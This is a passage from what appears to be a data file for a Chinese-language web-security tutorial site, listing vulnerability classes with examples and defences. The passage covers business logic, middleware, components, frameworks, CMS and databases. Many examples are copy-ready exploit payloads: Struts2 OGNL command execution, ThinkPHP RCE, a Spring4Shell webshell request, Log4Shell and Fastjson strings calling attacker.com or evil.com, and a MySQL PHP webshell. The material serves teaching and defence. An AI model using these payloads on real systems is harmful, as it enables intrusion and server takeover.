          "交易重放: 重复支付请求多次提取资金",
          "会话固定: 使用预先获取的会话ID强制用户使用已知会话",
          "OTP绕过: 重用一次性密码或验证码"
        ],
        difficulty: 'intermediate'
      },
      {
        title: '验证码复用',
        content: '验证码复用漏洞存在于验证码实现不当的系统中，使攻击者能够使用已知的验证码回答多次，或在不同上下文中重用同一验证码。这通常源于验证码状态跟踪不足或验证码生命周期管理不当。',
        examples: [
          "验证码会话不关联: 同一验证码对所有用户有效",
          "验证码不失效: 使用过的验证码仍然有效",
          "验证码序列可预测: 基于时间或简单算法生成的验证码",
          "验证码跨功能有效: 在一个功能生成的验证码用于另一个功能"
        ],
        difficulty: 'intermediate'
      },
      {
        title: '支付逻辑',
        content: '支付逻辑漏洞存在于处理金融交易的系统中，允许攻击者操纵订单处理、支付金额或绕过支付步骤。这些漏洞可能导致经济损失、服务免费使用或欺诈交易。',
        examples: [
          "价格操纵: 在客户端修改产品价格或数量",
          "货币套利: 在货币转换过程中利用舍入错误",
          "竞争条件: 在支付前获取产品/服务",
          "负数金额: 使用负值导致退款或账户增值",
          "优惠券滥用: 多次使用一次性优惠券或组合使用不兼容优惠"
        ],
        difficulty: 'advanced'
      },
      {
        title: '水平越权',
        content: '水平越权漏洞允许用户访问或修改属于同级别其他用户的资源。这通常发生在应用程序验证用户已认证，但未验证用户是否有权访问特定资源时。',
        examples: [
          "直接对象引用: 修改URL参数访问其他用户的资料 (/profile?id=123 改为 /profile?id=456)",
          "API端点保护不足: 使用有效令牌访问他人资源 (/api/documents/user_id/456)",
          "功能级授权缺失: 拥有查看自身记录权限但可修改他人记录",
          "批量导出: 使用批量功能越权获取多用户数据"
        ],
        difficulty: 'intermediate'
      },
      {
        title: '垂直越权',
        content: '垂直越权漏洞允许用户执行高于其权限级别的操作，本质上是特权提升攻击。这发生在应用程序未正确检查用户权限或角色时。',
        examples: [
          "管理功能访问: 普通用户访问管理控制面板 (/admin/users)",
          "功能强制: 普通用户执行管理操作 (DELETE /api/users/123)",
          "隐藏功能: 访问界面中不可见但后端存在的高权限功能",
          "参数篡改: 修改权限相关参数 (role=user 改为 role=admin)"
        ],
        difficulty: 'advanced'
      },
      {
        title: '未授权访问',
        content: '未授权访问漏洞允许未经身份验证的用户访问受保护资源或执行需要认证的操作。这通常发生在应用程序仅在某些入口点强制认证，但忽略了其他访问路径的问题。',
        examples: [
          "直接URL访问: 绕过认证页面直接访问内部页面 (/dashboard)",
          "API端点缺乏认证: 未保护的API端点 (/api/user/data)",
          "预认证页面访问控制不足: 访问旨在认证后使用的功能",
          "备用入口点: 通过替代URL路径或不同域访问相同资源"
        ],
        difficulty: 'beginner'
      },
      {
        title: '登录认证绕过',
        content: '登录认证绕过漏洞允许攻击者在不提供有效凭据的情况下获得系统访问权限。这些漏洞利用身份验证机制的实现缺陷，从而绕过整个认证过程。',
        examples: [
          "默认或后门凭据: 使用开发者留下的默认账户",
          "身份验证缺陷: SQL注入、弱加密或条件逻辑错误",
          "多因素认证绕过: 跳过MFA步骤或重用令牌",
          "会话固定/劫持: 使用预先获取的会话ID",
          "认证状态操纵: 修改cookie或localStorage中的认证标志"
        ],
        difficulty: 'advanced'
      },
      {
        title: '密码重置',
        content: '密码重置漏洞存在于密码恢复和重置机制中，允许攻击者重置受害者的密码并接管其账户。这通常利用令牌验证、用户标识或通知传递中的逻辑缺陷。',
        examples: [
          "重置令牌可预测: 使用简单序列或时间戳生成的令牌",
          "令牌未绑定用户: 同一令牌可用于重置任何用户密码",
          "令牌未过期: 长期有效的重置链接",
          "账户枚举: 重置流程泄露用户存在信息",
          "重置问题弱: 容易推测或社会工程获取的安全问题"
        ],
        difficulty: 'intermediate'
      },
      {
        title: '空口令',
        content: '空口令漏洞允许用户使用空白或缺失的密码进行认证。这种漏洞源于认证系统中的逻辑错误，尤其是在处理空密码字符串、缺少必要验证或默认凭据未更改时。',
        examples: [
          "空密码接受: 系统接受空白密码字段",
          "默认空密码: 新用户账户或重置后的默认状态",
          "认证逻辑缺陷: 密码验证被跳过的条件路径",
          "API端点不验证: 直接API调用接受空密码",
          "密码字段处理错误: 空格或特殊字符处理不当"
        ],
        difficulty: 'beginner'
      }
    ],
    protection: [
      '实施请求速率限制，防止枚举和暴力攻击',
      '采用一致的错误信息，避免信息泄露',
      '对所有敏感操作实施授权检查',
      '验证所有客户端传入参数，包括隐藏字段',
      '使用交易令牌防止重放和CSRF',
      '审核业务流程的所有步骤和条件',
      '实施验证码和其他人工检查机制',
      '采用基于角色的访问控制(RBAC)和最小权限原则',
      '对所有密码和敏感操作实施强大的验证机制',
      '定期进行业务逻辑渗透测试'
    ]
  },
  'middleware': {
    title: '中间件漏洞',
    icon: faServer,
    description: '中间件漏洞存在于支持Web应用程序的软件层中，如应用服务器、代理和负载均衡器。这些组件管理网络通信、请求处理和资源分配，漏洞可能导致远程代码执行、敏感信息泄露或服务中断。',
    sections: [
      {
        title: 'Weblogic漏洞概述',
        content: 'Oracle WebLogic Server是一个流行的Java EE应用服务器，由于其广泛部署在企业环境中，成为攻击者的高价值目标。WebLogic的漏洞通常涉及其T3协议、反序列化机制和管理控制台等组件。',
        examples: [
          "CVE-2020-14882: WebLogic控制台未授权RCE",
          "CVE-2019-2725: WebLogic WLS组件反序列化RCE",
          "CVE-2018-2894: WebLogic未授权上传漏洞",
          "CVE-2017-10271: WebLogic XMLDecoder反序列化漏洞"
        ],
        difficulty: 'intermediate'
      },
      {
        title: 'Weblogic多种典型漏洞利用',
        content: 'WebLogic的主要漏洞类型包括反序列化漏洞、未授权访问、文件上传和XML处理缺陷。这些漏洞大多可导致远程代码执行，对企业系统构成严重威胁。',
        examples: [
          "控制台RCE (CVE-2020-14882):\n1. 访问: /console/css/%252e%252e%252fconsole.portal\n2. 添加payload: ?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession('java.lang.Runtime.getRuntime().exec(\"命令\");')",
          "WSAT反序列化 (CVE-2017-10271):\nPOST /wls-wsat/CoordinatorPortType HTTP/1.1\nContent-Type: text/xml\n\n<soapenv:Envelope xmlns...><soapenv:Header/><soapenv:Body><java>...[payload]...</java></soapenv:Body></soapenv:Envelope>",
          "T3协议利用 (CVE-2015-4852):\n使用T3协议发送恶意序列化对象，利用Commons Collections链执行命令"
        ],
        difficulty: 'advanced'
      },
      {
        title: 'Tomcat典型漏洞利用',
        content: 'Apache Tomcat是最常用的Java Servlet容器之一，其漏洞通常涉及权限问题、配置错误和代码缺陷。Tomcat漏洞影响广泛，从信息泄露到远程代码执行不等。',
        examples: [
          "CVE-2020-1938 (幽灵猫): AJP协议未授权文件读取/包含\n使用专用工具发送特制AJP请求读取WEB-INF下敏感文件",
          "CVE-2017-12615: PUT方法任意文件写入\nPUT /shell.jsp/ HTTP/1.1\n[JSP内容]\n利用Windows文件名处理特性执行JSP",
          "默认管理界面弱口令:\n访问/manager/html使用默认凭据(admin/admin)，然后上传WAR包执行代码",
          "CVE-2019-0232: Windows环境下CGI启用时的命令注入\n/cgi-bin/hello.bat?&dir 通过查询参数注入命令"
        ],
        difficulty: 'intermediate'
      },
      {
        title: 'Jboss典型漏洞利用',
        content: 'JBoss Application Server(现为WildFly)是一个开源Java应用服务器，其漏洞主要涉及默认配置不安全、管理接口暴露和反序列化问题。JBoss在企业环境中的广泛使用使其成为引人注目的攻击目标。',
        examples: [
          "默认JMX控制台未授权访问:\n访问/jmx-console/，利用DeploymentScanner部署war包",
          "CVE-2017-12149: JBoss反序列化RCE\nPOST /invoker/readonly HTTP/1.1\n[恶意序列化对象] 利用Hibernate链执行命令",
          "CVE-2010-0738: JMX控制台安全绕过\n访问/jmx-console/HtmlAdaptor 绕过HTTP认证部署恶意应用",
          "JBossMQ JMS实现漏洞:\n连接JMS端口发送恶意消息触发反序列化"
        ],
        difficulty: 'advanced'
      },
      {
        title: '其他中间件漏洞',
        content: '除主要应用服务器外，Web系统中使用的其他中间件组件也存在各种安全漏洞。这包括代理服务器、负载均衡器、消息队列和缓存系统等。',
        examples: [
          "Nginx: 目录遍历(CVE-2009-3898)、CRLF注入、配置错误(如代理未授权访问)",
          "Apache HTTP Server: mod_cgi模块命令注入(CVE-2014-6271 Shellshock)、拒绝服务漏洞",
          "HAProxy: 内存泄漏、HTTP请求走私",
          "RabbitMQ: 默认凭据、STOMP协议漏洞、权限配置不当",
          "Varnish Cache: 缓存中毒、信息泄露"
        ],
        difficulty: 'intermediate'
      },
      {
        title: '中间件配置漏洞',
        content: '中间件配置错误可能导致严重安全问题，即使软件本身没有漏洞。这包括默认凭据、不必要开放的端口、调试功能启用和过度权限等问题。',
        examples: [
          "默认管理员凭据未更改(admin/admin, tomcat/tomcat)",
          "调试接口暴露(如JMX远程未授权访问)",
          "过度权限(中间件以root/Administrator权限运行)",
          "TLS配置错误(支持弱加密套件、过时协议版本)",
          "默认示例应用未删除(如Tomcat的examples目录)"
        ],
        difficulty: 'beginner'
      },
      {
        title: '中间件漏洞防护',
        content: '中间件安全需要多层次防护策略，包括强化配置、定期更新、网络分段和适当的监控。由于中间件系统通常是关键基础设施，综合防护尤为重要。',
        examples: [
          "定期更新中间件到最新安全版本",
          "移除所有示例应用和非必要组件",
          "更改默认凭据并实施强密码策略",
          "限制中间件仅监听必要端口/接口",
          "配置Web应用防火墙(WAF)过滤恶意请求",
          "实施网络分段隔离中间件组件",
          "以最小权限运行中间件服务",
          "禁用非必要服务和协议(如AJP)"
        ],
        difficulty: 'intermediate'
      }
    ],
    protection: [
      '及时应用安全补丁和更新',
      '移除或禁用未使用的功能和示例应用',
      '更改默认凭据和配置',
      '限制中间件服务器的网络访问',
      '实施深度防御策略',
      '部署Web应用防火墙(WAF)',
      '定期进行安全审计和漏洞扫描',
      '监控异常访问和行为',
      '配置正确的TLS设置',
      '以最小权限原则配置中间件服务'
    ]
  },
  'components': {
    title: '组件漏洞',
    icon: faPuzzlePiece,
    description: '组件漏洞存在于集成到应用程序中的第三方库、框架和软件模块中。这些组件漏洞可能影响整个应用程序的安全性，导致数据泄露、远程代码执行或认证绕过等严重问题。',
    sections: [
      {
        title: 'Shiro组件典型漏洞利用',
        content: 'Apache Shiro是一个强大的Java安全框架，用于认证、授权和会话管理。其中最著名的漏洞是默认加密密钥导致的反序列化漏洞，允许攻击者构造恶意cookie获取服务器控制权。',
        examples: [
          "CVE-2016-4437 (默认密钥漏洞):\n1. 利用已知的默认密钥(kPH+bIxk5D2deZiIxcaaaA==)加密恶意序列化对象\n2. 将结果放入rememberMe cookie\n3. 发送请求触发反序列化执行命令",
          "CVE-2019-12422 (固定密钥错误配置):\n即使用户更改了密钥，如果直接硬编码在配置中，可能通过源码/配置泄露获取",
          "Shiro认证绕过(CVE-2020-1957):\n特定路径匹配规则下，使用/%2e/path可绕过访问控制",
          "利用工具: ShiroScan, ShiroExploit等自动化工具可检测和利用Shiro漏洞"
        ],
        difficulty: 'advanced'
      },
      {
        title: 'Fastjson典型漏洞利用',
        content: 'Fastjson是阿里巴巴开发的高性能JSON处理库，广泛用于Java应用。其主要漏洞是允许反序列化任意类，通过特定JSON结构触发远程代码执行，影响大量使用该库的应用程序。',
        examples: [
          "CVE-2017-18349 (autoType绕过):\n构造JSON: {\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://evil.com/Exploit\",\"autoCommit\":true}",
          "1.2.47版本绕过(CVE-2019-14489):\n使用L前缀: {\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"ldap://evil.com/Exploit\",\"autoCommit\":true}",
          "特定版本利用链:\n- JNDI注入: com.sun.rowset.JdbcRowSetImpl\n- 文件读取: com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\n- 网络请求: java.net.URLClassLoader",
          "利用工具: fastjson-exp等可自动检测和利用不同版本的Fastjson漏洞"
        ],
        difficulty: 'expert'
      },
      {
        title: 'Log4j典型漏洞利用',
        content: 'Log4j是Apache基金会的流行Java日志组件，2021年底发现的Log4Shell漏洞(CVE-2021-44228)是近年最严重的安全漏洞之一。这个JNDI注入漏洞允许通过日志消息执行远程代码，影响了全球数百万系统。',
        examples: [
          "基本JNDI注入(CVE-2021-44228):\n\\${jndi:ldap://attacker.com/exploit} 插入到被记录的字段中",
          "绕过WAF技术:\n\\${\\${lower:j}\\${lower:n}\\${lower:d}\\${lower:i}:\\${lower:l}\\${lower:d}\\${lower:a}\\${lower:p}://attacker.com/exploit}",
          "其他协议利用:\n\\${jndi:rmi://attacker.com/exploit}\n\\${jndi:dns://attacker.com/exploit}",
          "常见攻击向量:\n- HTTP头(User-Agent, X-Forwarded-For)\n- 表单字段\n- JSON字段\n- 文件名\n- 任何被记录的用户输入"
        ],
        difficulty: 'intermediate'
      },
      {
        title: 'Spring组件漏洞',
        content: 'Spring Framework是Java生态系统中最流行的应用开发框架，其各个模块可能包含安全漏洞。从表达式注入到远程代码执行，Spring相关漏洞影响了大量企业应用程序。',
        examples: [
          "Spring4Shell(CVE-2022-22965):\n通过特制请求触发类加载器访问导致远程代码执行",
          "Spring Cloud Function SpEL注入(CVE-2022-22963):\n在header中添加spring.cloud.function.routing-expression参数含SpEL表达式",
          "Spring Boot Actuator未授权访问:\n访问/actuator/env, /actuator/heapdump等敏感端点",
          "Spring Data Commons RCE(CVE-2018-1273):\n在表单参数中使用嵌套属性名称包含SpEL表达式"
        ],
        difficulty: 'advanced'
      },
      {
        title: '其他常见组件漏洞',
        content: '除了上述关键组件外，还有许多常用库和框架存在各种安全漏洞。组件漏洞特别危险，因为一个库的漏洞可能影响数千个依赖它的应用程序。',
        examples: [
          "Jackson反序列化(CVE-2019-12384):\n利用默认类型信息触发反序列化漏洞",
          "Apache Commons Collections(CVE-2015-7501):\n不安全反序列化导致RCE，多个框架受影响",
          "Struts2 OGNL表达式注入:\n多个版本允许通过特制请求执行OGNL表达式",
          "MyBatis SQL注入:\n动态SQL功能使用不当导致注入",
          "Hibernate搜索漏洞:\n允许通过Lucene查询语法进行SQL注入"
        ],
        difficulty: 'advanced'
      },
      {
        title: '组件漏洞检测与修复',
        content: '组件漏洞管理需要系统化方法，包括依赖扫描、版本控制和持续监控。由于依赖关系复杂，组件漏洞修复通常需要权衡升级成本和安全风险。',
        examples: [
          "使用工具扫描依赖:\n- OWASP Dependency-Check\n- Snyk\n- WhiteSource\n- GitHub Dependabot",
          "版本管理最佳实践:\n- 锁定依赖版本\n- 定期更新依赖\n- 发布前完整测试",
          "临时缓解措施:\n- 添加WAF规则\n- 自定义补丁\n- 配置限制",
          "建立漏洞响应流程:\n- 监控CVE发布\n- 评估影响\n- 确定优先级\n- 实施修复"
        ],
        difficulty: 'intermediate'
      }
    ],
    protection: [
      '保持组件和依赖项更新至最新安全版本',
      '实施软件组成分析(SCA)监控依赖',
      '移除未使用的依赖项',
      '从可信来源获取组件',
      '监控安全公告和CVE数据库',
      '制定组件漏洞响应策略',
      '配置组件最小化暴露面',
      '使用虚拟补丁(WAF规则)保护已知漏洞',
      '实施最小权限原则运行组件',
      '定期进行漏洞扫描和渗透测试'
    ]
  },
  'frameworks': {
    title: '第三方框架漏洞',
    icon: faLayerGroup,
    description: '第三方框架漏洞存在于流行的Web开发框架中，如ThinkPHP、Struts2和Spring。这些框架被大量网站和企业应用使用，因此其漏洞可能影响数以千计的应用程序，成为黑客的高价值目标。',
    sections: [
      {
        title: 'ThinkPHP多种典型漏洞利用',
        content: 'ThinkPHP是一个流行的中文PHP开发框架，在国内广泛使用。其历史版本中存在多个安全漏洞，主要涉及未正确过滤用户输入导致的远程代码执行、SQL注入和文件包含等问题。',
        examples: [
          "ThinkPHP 5.x 远程代码执行(RCE):\n/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id",
          "ThinkPHP 5.0.x SQL注入:\n/index.php?ids[0,updatexml(1,concat(0x7e,(select%20user()),0x7e),1)]=1",
          "ThinkPHP 3.x 任意文件包含:\n/index.php?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Home/xx.log",
          "ThinkPHP 5.0.24 文件包含:\n/index.php?s=/home/article/view_recent/name/1' union select 1,2,(select file_get_contents('/etc/passwd')),4,5,6,7,8,9%23"
        ],
        difficulty: 'intermediate'
      },
      {
        title: 'Struts2多种典型漏洞利用',
        content: 'Apache Struts2是一个流行的Java Web应用框架，其众多版本中发现的安全漏洞对企业应用构成了严重威胁。Struts2最著名的漏洞涉及OGNL表达式注入，允许远程代码执行。',
        examples: [
          "S2-057(CVE-2018-11776): 命名空间值与OGNL表达式注入\n/%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%29%28%23cmd%3D%22id%22%29%28%23iswin%3D%28%40java.lang.System%40getProperty%28%22os.name%22%29.toLowerCase%28%29.contains%28%22win%22%29%29%28%23cmds%3D%28%23iswin%3F%7B%22cmd.exe%22%2C%22%2Fc%22%2C%23cmd%7D%3A%7B%22%2Fbin%2Fbash%22%2C%22-c%22%2C%23cmd%7D%29%29%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29%28%23p.redirectErrorStream%28true%29%29%28%40org.apache.commons.io.IOUtils%40toString%28%23p.start%28%29.getInputStream%28%29%29%29%7D/actionChain1.action",
          "S2-045(CVE-2017-5638): Content-Type头OGNL注入\nContent-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",
          "S2-032(CVE-2016-3081): 方法调用时的OGNL注入\n/index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=&encoding=UTF-8&cmd=id",
          "S2-016(CVE-2013-2251): 参数值OGNL注入\nredirect:\\${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}"
        ],
        difficulty: 'expert'
      },
      {
        title: 'Spring框架典型漏洞利用',
        content: 'Spring框架是Java领域最流行的应用开发框架，其众多组件和模块可能包含各种漏洞。从Spring MVC到Spring Cloud，各种Spring组件的漏洞常被用于高级攻击。',
        examples: [
          "Spring4Shell(CVE-2022-22965):\nPOST请求包含class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=",
          "Spring Cloud Function SPEL注入(CVE-2022-22963):\n在请求头添加: spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\"touch /tmp/pwned\")",
          "Spring Data MongoDB SPEL注入(CVE-2022-22980):\n构造包含SPEL表达式的查询参数",
          "Spring Boot Actuator端点未授权访问:\n访问/actuator/env, /actuator/jolokia等敏感端点获取配置信息或执行操作"
        ],
        difficulty: 'advanced'
      },
      {
        title: '若依框架典型漏洞利用',
        content: '若依(RuoYi)是一个基于SpringBoot的权限管理系统，在国内较为流行。若依框架可能存在认证绕过、权限提升和代码注入等安全问题，特别是在配置不当的情况下。',
        examples: [
          "任意文件读取漏洞:\n利用下载功能读取服务器任意文件，如/common/download?fileName=../../../etc/passwd&delete=true",
          "默认口令登录:\n使用admin/admin123等默认凭据登录管理后台",
          "后台模板注入:\n在若依低版本中，代码生成功能可能存在模板注入漏洞",
          "权限绕过:\n某些版本中可能存在未正确校验权限的接口"
        ],
        difficulty: 'intermediate'
      },
      {
        title: '其他流行框架漏洞',
        content: '除了上述框架外，许多其他流行的Web开发框架也存在各种安全漏洞。这些框架被广泛使用，其漏洞可能影响大量应用程序。',
        examples: [
          "Laravel框架漏洞:\n- CVE-2021-3129: 日志系统远程代码执行\n- 配置不当导致的.env文件泄露",
          "Django框架漏洞:\n- SQL注入(CVE-2019-19844)\n- 模板注入漏洞",
          "Ruby on Rails漏洞:\n- CVE-2019-5418: 文件内容泄露\n- CVE-2020-8163: 远程代码执行",
          "Express.js漏洞:\n- 原型污染\n- NoSQL注入"
        ],
        difficulty: 'advanced'
      },
      {
        title: '框架漏洞防护策略',
        content: '防御框架漏洞需要综合措施，包括及时更新、安全配置、代码审计和运行时保护。由于框架漏洞影响广泛，企业应建立系统化的框架安全管理流程。',
        examples: [
          "框架版本管理:\n- 跟踪使用的框架版本\n- 订阅安全公告\n- 实施自动化依赖检查",
          "安全配置:\n- 禁用不必要的功能\n- 移除示例代码\n- 配置安全标头",
          "运行时保护:\n- 配置WAF规则针对框架漏洞\n- 实施RASP解决方案\n- 监控异常请求",
          "开发实践:\n- 代码审计\n- 渗透测试\n- 安全培训"
        ],
        difficulty: 'intermediate'
      }
    ],
    protection: [
      '及时更新框架到最新安全版本',
      '关注安全公告和漏洞报告',
      '移除或禁用不必要的框架功能',
      '实施深度防御策略，不仅依赖框架安全',
      '使用Web应用防火墙(WAF)缓解已知框架漏洞',
      '配置最小权限运行应用',
      '定期进行安全审计和渗透测试',
      '实施运行时应用自我保护(RASP)',
      '使用依赖扫描工具监控框架漏洞',
      '记录并监控异常请求和行为'
    ]
  },
  'cms': {
    title: 'CMS漏洞利用实战',
    icon: faGlobe,
    description: '内容管理系统(CMS)漏洞存在于WordPress、Drupal、Joomla等流行的CMS平台中。由于这些系统被数百万网站使用，其漏洞成为黑客攻击的热门目标，可导致网站劫持、数据泄露或服务器控制权丧失。',
    sections: [
      {
        title: 'WordPress多种典型漏洞利用',
        content: 'WordPress是全球最流行的CMS，支持超过40%的网站。其核心系统和插件生态系统中存在的漏洞可能导致严重安全事件，从身份认证绕过到远程代码执行。',
        examples: [
          "WordPress插件漏洞利用:\n- WP File Manager插件RCE(CVE-2020-25213)\n/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php\n- Social Warfare插件RCE(CVE-2019-9978)\n/?swp_debug=load_options&swp_url=http://evil.com/payload.txt",
          "WordPress主题漏洞:\n利用主题编辑器上传恶意模板文件，或利用主题内置功能的安全漏洞",
          "WordPress认证漏洞:\nWordPress REST API认证绕过(CVE-2017-8295)，允许重置任意用户密码",
          "WordPress XML-RPC攻击:\n利用xmlrpc.php进行密码暴力破解或DoS攻击"
        ],
        difficulty: 'intermediate'
      },
      {
        title: 'WordPress信息泄露与枚举',
        content: 'WordPress站点可能泄露各种敏感信息，包括用户名、插件版本和配置详情。攻击者可以枚举这些信息以识别潜在的漏洞点和攻击向量。',
        examples: [
          "用户枚举:\n访问/?author=1可能重定向到作者页面，泄露用户名",
          "插件探测:\n- 检查/wp-content/plugins/[plugin-name]/路径是否存在\n- 分析页面源码中的插件引用",
          "主题识别:\n分析HTML源码中的样式表引用或查看/wp-content/themes/[theme-name]/",
          "WordPress版本信息:\n查看页面源码中的meta标签或RSS feed中的generator标签"
        ],
        difficulty: 'beginner'
      },
      {
        title: 'WordPress提权与后门',
        content: 'WordPress权限提升漏洞允许攻击者从普通用户升级到管理员，或利用管理员权限维持对站点的长期访问。这通常涉及数据库操作或文件系统修改。',
        examples: [
          "数据库提权:\nUPDATE `wp_users` SET `user_pass` = MD5('new_pass'), `user_login` = 'new_admin' WHERE `ID` = 1;",
          "主题/插件后门:\n在主题函数文件(functions.php)或活跃插件中插入PHP后门代码",
          "钓鱼后台:\n创建虚假登录页面获取管理员凭据",
          "wp-config.php操作:\n修改数据库凭据或添加DISALLOW_FILE_EDIT为false以启用编辑器"
        ],
        difficulty: 'advanced'
      },
      {
        title: 'Drupal漏洞利用',
        content: 'Drupal是一个强大的CMS平台，常用于构建企业级网站。由于其复杂性，Drupal可能存在严重漏洞，包括著名的"Drupalgeddon"系列远程代码执行漏洞。',
        examples: [
          "Drupalgeddon 2 (CVE-2018-7600):\nPOST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax 携带特制payload执行代码",
          "Drupalgeddon 3 (CVE-2018-7602):\n需要认证的远程代码执行漏洞，通过AJAX API触发",
          "SQL注入 (SA-CORE-2014-005):\n在URL参数中使用特殊字符构造SQL注入",
          "模块漏洞:\n如RESTWS模块远程代码执行(CVE-2019-6340)"
        ],
        difficulty: 'advanced'
      },
      {
        title: 'Joomla漏洞利用',
        content: 'Joomla是另一个流行的CMS平台，在其历史中存在多个严重漏洞。Joomla漏洞通常存在于核心组件或扩展中，从SQL注入到远程代码执行不等。',
        examples: [
          "Joomla核心SQL注入(CVE-2015-7297):\n利用com_contenthistory组件执行SQL注入",
          "Joomla远程代码执行(CVE-2015-8562):\n通过User-Agent头触发PHP对象注入",
          "Joomla组件漏洞:\n- com_fabrik组件文件上传\n- com_foxcontact组件代码执行",
          "Joomla信息泄露:\n/administrator/manifests/files/joomla.xml可能泄露精确版本信息"
        ],
        difficulty: 'intermediate'
      },
      {
        title: '其他CMS漏洞',
        content: '除了主流CMS外，许多其他内容管理系统也存在各种安全漏洞。这些包括开源系统如TYPO3、Magento，以及专有系统。',
        examples: [
          "Magento漏洞:\n- Magento SQL注入(PRODSECBUG-2198)\n- Magento未授权API访问",
          "TYPO3漏洞:\n- RCE via phar:// wrapper\n- 文件包含和CSRF漏洞",
          "OpenCart漏洞:\n- SQL注入\n- 文件上传漏洞",
          "Umbraco漏洞:\n- 远程代码执行\n- XSS和文件上传漏洞"
        ],
        difficulty: 'advanced'
      },
      {
        title: 'CMS漏洞防护最佳实践',
        content: 'CMS安全需要全面的防护措施，包括定期更新、加固配置、访问控制和持续监控。由于CMS平台的广泛使用，它们是网络攻击的常见目标。',
        examples: [
          "更新策略:\n- 及时安装安全补丁\n- 使用自动更新功能\n- 监控安全公告",
          "加固措施:\n- 删除默认账户和示例内容\n- 限制管理员访问IP\n- 使用安全插件/模块",
          "访问控制:\n- 实施二因素认证\n- 强制使用强密码\n- 限制管理面板访问",
          "监控与响应:\n- 使用WAF保护CMS\n- 监控文件变更\n- 定期备份"
        ],
        difficulty: 'intermediate'
      }
    ],
    protection: [
      '及时更新CMS核心、主题和插件',
      '移除未使用的插件、主题和组件',
      '实施强密码策略并使用二因素认证',
      '使用Web应用防火墙(WAF)过滤恶意请求',
      '限制管理界面访问IP或使用VPN',
      '禁用未使用的功能和API',
      '定期备份网站文件和数据库',
      '监控文件变更和可疑活动',
      '使用安全插件加固CMS',
      '定期进行安全审计和渗透测试'
    ]
  },
  'database': {
    title: '数据库漏洞利用实战',
    icon: faHdd,
    description: '数据库漏洞可能导致未授权访问、数据泄露、数据篡改甚至服务器控制权丧失。了解MySQL、Redis和PostgreSQL等常见数据库系统的安全漏洞及其利用技术，对保障数据安全至关重要。',
    sections: [
      {
        title: 'MySQL典型漏洞利用',
        content: 'MySQL是最流行的开源关系型数据库之一，其安全漏洞可能导致信息泄露、权限提升或远程代码执行。了解MySQL安全配置和常见攻击向量对保护数据库安全至关重要。',
        examples: [
          "MySQL认证绕过(CVE-2012-2122):\n利用认证机制实现缺陷，通过反复连接尝试，最终能无密码登录",
          "MySQL UDF提权:\n1. 创建恶意的用户定义函数\nCREATE FUNCTION sys_exec RETURNS INT SONAME 'udf.dll';\n2. 执行系统命令\nSELECT sys_exec('whoami');",
          "MOF提权利用:\n利用MySQL写入特权在Windows系统上写入MOF文件实现提权",
          "MySQL本地文件访问:\n使用LOAD_FILE()读取文件或INTO DUMPFILE/OUTFILE写入文件\nSELECT LOAD_FILE('/etc/passwd');\nSELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php';"
        ],
        difficulty: 'advanced'
      },
      {
        title: 'MySQL配置错误',
        content: 'MySQL配置错误是最常见的数据库安全问题之一，包括默认凭据、过度权限和网络曝露等问题。攻击者可以利用这些配置缺陷获取未授权访问或提升权限。',
        examples: [
          "弱口令和默认凭据:\nroot/root, root/(空密码)等默认或弱密码配置",
